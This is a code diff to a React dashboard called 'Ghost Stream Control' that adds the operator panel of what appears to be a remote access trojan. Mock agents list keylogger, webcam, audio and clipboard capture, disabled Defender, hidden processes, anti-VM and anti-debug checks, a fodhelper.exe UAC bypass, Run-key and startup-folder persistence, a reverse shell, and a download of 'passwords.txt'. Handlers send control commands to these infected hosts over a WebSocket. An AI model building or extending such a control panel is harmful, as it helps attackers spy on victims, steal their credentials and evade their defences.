@@ -1,4 +1,5 @@
 import { useEffect, useMemo, useState } from "react";
+import { useWebSocket } from "@/hooks/useWebSocket";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
 import { Separator } from "@/components/ui/separator";
@@ -17,6 +18,12 @@ import ActiveAgentsCard from "@/components/dashboard/ActiveAgentsCard";
 import ConfigStatusCard from "@/components/dashboard/ConfigStatusCard";
 import PasswordManagementCard from "@/components/dashboard/PasswordManagementCard";
 import FilterToolbar from "@/components/dashboard/FilterToolbar";
+import StreamingControlPanel from "@/components/streaming/StreamingControlPanel";
+import SecurityControlPanel from "@/components/security/SecurityControlPanel";
+import PersistenceControlPanel from "@/components/persistence/PersistenceControlPanel";
+import MonitoringControlPanel from "@/components/monitoring/MonitoringControlPanel";
+import FileTransferPanel from "@/components/filetransfer/FileTransferPanel";
+import type { Agent, DashboardMetrics } from "@/types/dashboard";
 
 // Small helper to update meta for SEO
 const setMeta = (name: string, content: string) => {
@@ -71,43 +78,154 @@ const Index = () => {
   const [check, setCheck] = useState("agent");
   const [range, setRange] = useState("24h");
   const [bypassView, setBypassView] = useState<'persistence' | 'uac'>("persistence");
+  const [selectedAgent, setSelectedAgent] = useState<string | null>(null);
+  const [activePanel, setActivePanel] = useState<string | null>(null);
+
+  // WebSocket connection for real-time updates
+  const { isConnected, lastMessage, sendMessage } = useWebSocket('ws://localhost:8080/ws');
+
+  // Mock agent data - in real implementation, this would come from WebSocket
+  const [agents, setAgents] = useState<Agent[]>([
+    {
+      id: "agent-001",
+      hostname: "DESKTOP-ABC123",
+      ip: "192.168.1.100",
+      os: "Windows 11 Pro",
+      status: "online",
+      lastSeen: "2024-01-15T14:35:00Z",
+      capabilities: ["screen", "camera", "audio", "keylogger", "clipboard"],
+      streams: { screen: true, camera: false, audio: true },
+      persistence: { registry: true, startup: true, scheduledTasks: false, services: true },
+      security: { defenderDisabled: true, avDisabled: false, processHidden: true, antiVm: true, antiDebug: true },
+      privileges: { admin: true, uacBypassed: true, method: "fodhelper.exe" }
+    },
+    {
+      id: "agent-002", 
+      hostname: "LAPTOP-XYZ789",
+      ip: "192.168.1.101",
+      os: "Windows 10 Home",
+      status: "offline",
+      lastSeen: "2024-01-15T13:20:00Z",
+      capabilities: ["screen", "keylogger"],
+      streams: { screen: false, camera: false, audio: false },
+      persistence: { registry: false, startup: true, scheduledTasks: true, services: false },
+      security: { defenderDisabled: false, avDisabled: false, processHidden: false, antiVm: false, antiDebug: false },
+      privileges: { admin: false, uacBypassed: false, method: "" }
+    }
+  ]);
+
+  // Mock file transfers
+  const [fileTransfers, setFileTransfers] = useState([
+    {
+      id: "transfer-001",
+      filename: "passwords.txt",
+      size: 1024000,
+      progress: 75,
+      direction: "download" as const,
+      status: "active" as const,
+      speed: 102400
+    },
+    {
+      id: "transfer-002", 
+      filename: "screenshot.png",
+      size: 2048000,
+      progress: 100,
+      direction: "upload" as const,
+      status: "completed" as const,
+      speed: 0
+    }
+  ]);
 
   useEffect(() => {
     document.title = "Ghost Stream Control – Security Dashboard";
     setMeta("description", "Realtime security, streaming and controller status dashboard with interactive charts.");
   }, []);
 
+  // Handle WebSocket messages
+  useEffect(() => {
+    if (lastMessage) {
+      console.log('Received WebSocket message:', lastMessage);
+      // Handle different message types
+      switch (lastMessage.type) {
+        case 'agent_update':
+          setAgents(prev => prev.map(agent => 
+            agent.id === lastMessage.data.id ? { ...agent, ...lastMessage.data } : agent
+          ));
+          break;
+        case 'metrics_update':
+          // Update dashboard metrics
+          break;
+      }
+    }
+  }, [lastMessage]);
+
+  // Agent control handlers
+  const handleStreamToggle = (agentId: string, type: 'screen' | 'camera' | 'audio', action: 'start' | 'stop') => {
+    sendMessage({
+      type: 'stream_control',
+      data: { agentId, streamType: type, action }
+    });
+  };
+
+  const handleSecurityAction = (agentId: string, action: string, params?: any) => {
+    sendMessage({
+      type: 'security_control',
+      data: { agentId, action, params }
+    });
+  };
+
+  const handlePersistenceAction = (agentId: string, method: string, action: string, params?: any) => {
+    sendMessage({
+      type: 'persistence_control',
+      data: { agentId, method, action, params }
+    });
+  };
+
+  const handleMonitoringAction = (agentId: string, type: string, action: string, params?: any) => {
+    sendMessage({
+      type: 'monitoring_control',
+      data: { agentId, type, action, params }
+    });
+  };
+
+  const handleFileAction = (agentId: string, action: string, params?: any) => {
+    sendMessage({
+      type: 'file_control',
+      data: { agentId, action, params }
+    });
+  };
+
   // Overview donut datasets
   const agentReport = useMemo(() => (
     [
-      { name: "Problems", value: 8 },
-      { name: "Errors", value: 3 },
-      { name: "Bugs", value: 12 },
+      { name: "Problems", value: agents.filter(a => a.status === 'offline').length },
+      { name: "Errors", value: agents.filter(a => !a.security.defenderDisabled && a.status === 'online').length },
+      { name: "Bugs", value: agents.filter(a => !a.privileges.admin && a.status === 'online').length },
     ]
   ), []);
 
   const connectionStatus = useMemo(() => (
     [
-      { name: "Connected", value: 42 },
-      { name: "Offline", value: 7 },
+      { name: "Connected", value: agents.filter(a => a.status === 'online').length },
+      { name: "Offline", value: agents.filter(a => a.status === 'offline').length },
     ]
-  ), []);
+  ), [agents]);
 
   const persistenceMethods = useMemo(() => (
     [
-      { name: "Registry Keys", value: 11 },
-      { name: "Startup Entries", value: 5 },
-      { name: "Scheduled Tasks", value: 9 },
+      { name: "Registry Keys", value: agents.filter(a => a.persistence.registry).length },
+      { name: "Startup Entries", value: agents.filter(a => a.persistence.startup).length },
+      { name: "Scheduled Tasks", value: agents.filter(a => a.persistence.scheduledTasks).length },
     ]
-  ), []);
+  ), [agents]);
 
   const uacBypass = useMemo(() => (
     [
-      { name: "EventVwr.exe Hijacking", value: 4 },
-      { name: "sdclt.exe Bypass", value: 3 },
-      { name: "SilentCleanup", value: 6 },
+      { name: "EventVwr.exe Hijacking", value: agents.filter(a => a.privileges.method === 'EventVwr.exe').length },
+      { name: "sdclt.exe Bypass", value: agents.filter(a => a.privileges.method === 'sdclt.exe').length },
+      { name: "fodhelper.exe", value: agents.filter(a => a.privileges.method === 'fodhelper.exe').length },
     ]
-  ), []);
+  ), [agents]);
 
   // Trending line data (mocked)
   const [trendData, setTrendData] = useState(() =>
@@ -245,7 +363,80 @@ const Index = () => {
       <section className="container py-6 grid gap-6">
         <div className="grid gap-6 md:grid-cols-12">
           <div className="md:col-span-12 lg:col-span-3">
-            <ActiveAgentsCard />
+            <Card className="h-full">
+              <CardHeader>
+                <CardTitle className="flex items-center justify-between">
+                  Active Agents
+                  <Badge variant={isConnected ? "default" : "destructive"}>
+                    {isConnected ? "Connected" : "Disconnected"}
+                  </Badge>
+                </CardTitle>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                {agents.length === 0 ? (
+                  <div className="rounded-lg border border-border bg-muted/20 p-6 text-center text-sm text-muted-foreground">
+                    No agents connected
+                  </div>
+                ) : (
+                  <div className="space-y-2">
+                    {agents.map((agent) => (
+                      <div key={agent.id} className="flex items-center justify-between p-2 border rounded">
+                        <div className="space-y-1">
+                          <div className="flex items-center gap-2">
+                            <div className={`w-2 h-2 rounded-full ${agent.status === 'online' ? 'bg-green-500' : 'bg-red-500'}`} />
+                            <span className="font-medium text-sm">{agent.hostname}</span>
+                          </div>
+                          <div className="text-xs text-muted-foreground">{agent.ip} • {agent.os}</div>
+                        </div>
+                        <Button
+                          variant="outline"
+                          size="sm"
+                          onClick={() => {
+                            setSelectedAgent(agent.id);
+                            setActivePanel('streaming');
+                          }}
+                          disabled={agent.status !== 'online'}
+                        >
+                          Control
+                        </Button>
+                      </div>
+                    ))}
+                  </div>
+                )}
+                <div className="grid gap-2">
+                  <Button
+                    variant="secondary"
+                    className="justify-start font-medium"
+                    style={{ backgroundImage: "var(--gradient-primary)" }}
+                    onClick={() => setActivePanel('overview')}
+                  >
+                    Agent Stats
+                  </Button>
+                  <Button 
+                    variant="secondary" 
+                    className="justify-start bg-muted/30"
+                    onClick={() => setActivePanel('health')}
+                  >
+                    System Health
+                  </Button>
+                  <Button 
+                    variant="secondary" 
+                    className="justify-start bg-muted/30"
+                    onClick={() => setActivePanel('processes')}
+                  >
+                    List Processes
+                  </Button>
+                  <Button 
+                    variant="secondary" 
+                    className="justify-start bg-muted/30"
+                    onClick={() => window.location.reload()}
+                  >
+                    Refresh Dashboard
+                  </Button>
+                </div>
+                <Separator />
+              </CardContent>
+            </Card>
           </div>
 
           <Card className="relative md:col-span-6 lg:col-span-3">
@@ -325,6 +516,124 @@ const Index = () => {
             <PasswordManagementCard />
           </div>
         </div>
+
+        {/* Agent Control Panels */}
+        {selectedAgent && activePanel && (
+          <div className="space-y-6">
+            <div className="flex items-center justify-between">
+              <h2 className="text-xl font-semibold">
+                Agent Control - {agents.find(a => a.id === selectedAgent)?.hostname}
+              </h2>
+              <div className="flex gap-2">
+                <Button
+                  variant={activePanel === 'streaming' ? 'default' : 'outline'}
+                  size="sm"
+                  onClick={() => setActivePanel('streaming')}
+                >
+                  Streaming
+                </Button>
+                <Button
+                  variant={activePanel === 'security' ? 'default' : 'outline'}
+                  size="sm"
+                  onClick={() => setActivePanel('security')}
+                >
+                  Security
+                </Button>
+                <Button
+                  variant={activePanel === 'persistence' ? 'default' : 'outline'}
+                  size="sm"
+                  onClick={() => setActivePanel('persistence')}
+                >
+                  Persistence
+                </Button>
+                <Button
+                  variant={activePanel === 'monitoring' ? 'default' : 'outline'}
+                  size="sm"
+                  onClick={() => setActivePanel('monitoring')}
+                >
+                  Monitoring
+                </Button>
+                <Button
+                  variant={activePanel === 'files' ? 'default' : 'outline'}
+                  size="sm"
+                  onClick={() => setActivePanel('files')}
+                >
+                  Files
+                </Button>
+                <Button
+                  variant="ghost"
+                  size="sm"
+                  onClick={() => {
+                    setSelectedAgent(null);
+                    setActivePanel(null);
+                  }}
+                >
+                  Close
+                </Button>
+              </div>
+            </div>
+
+            {activePanel === 'streaming' && selectedAgent && (
+              <StreamingControlPanel
+                agentId={selectedAgent}
+                streams={{
+                  screen: { active: true, bitrate: 2500, fps: 30, resolution: "1920x1080" },
+                  camera: { active: false, bitrate: 0, fps: 0, resolution: "640x480" },
+                  audio: { active: true, bitrate: 128, sampleRate: 44100 }
+                }}
+                onStreamToggle={(type, action) => handleStreamToggle(selectedAgent, type, action)}
+              />
+            )}
+
+            {activePanel === 'security' && selectedAgent && (
+              <SecurityControlPanel
+                agentId={selectedAgent}
+                security={agents.find(a => a.id === selectedAgent)?.security || {
+                  defenderDisabled: false,
+                  avDisabled: false,
+                  processHidden: false,
+                  antiVm: false,
+                  antiDebug: false
+                }}
+                onSecurityAction={(action, params) => handleSecurityAction(selectedAgent, action, params)}
+              />
+            )}
+
+            {activePanel === 'persistence' && selectedAgent && (
+              <PersistenceControlPanel
+                agentId={selectedAgent}
+                persistence={{
+                  registry: { active: true, count: 3, entries: ["HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Agent"] },
+                  startup: { active: true, count: 1, entries: ["C:\\Users\\Admin\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\agent.exe"] },
+                  scheduledTasks: { active: false, count: 0, entries: [] },
+                  services: { active: true, count: 1, entries: ["GhostService"] }
+                }}
+                onPersistenceAction={(method, action, params) => handlePersistenceAction(selectedAgent, method, action, params)}
+              />
+            )}
+
+            {activePanel === 'monitoring' && selectedAgent && (
+              <MonitoringControlPanel
+                agentId={selectedAgent}
+                monitoring={{
+                  keylogger: { active: true, keyCount: 1247, lastActivity: "2024-01-15T14:35:20Z" },
+                  clipboard: { active: true, clipCount: 23, lastClipboard: "https://example.com/secret" },
+                  reverseShell: { active: false, commandCount: 0, lastCommand: "" },
+                  voiceControl: { active: false, commandCount: 0, lastCommand: "" }
+                }}
+                onMonitoringAction={(type, action, params) => handleMonitoringAction(selectedAgent, type, action, params)}
+              />
+            )}
+
+            {activePanel === 'files' && selectedAgent && (
+              <FileTransferPanel
+                agentId={selectedAgent}
+                transfers={fileTransfers}
+                onFileAction={(action, params) => handleFileAction(selectedAgent, action, params)}
+              />
+            )}
+          </div>
+        )}
       </section>
     </main>
   );
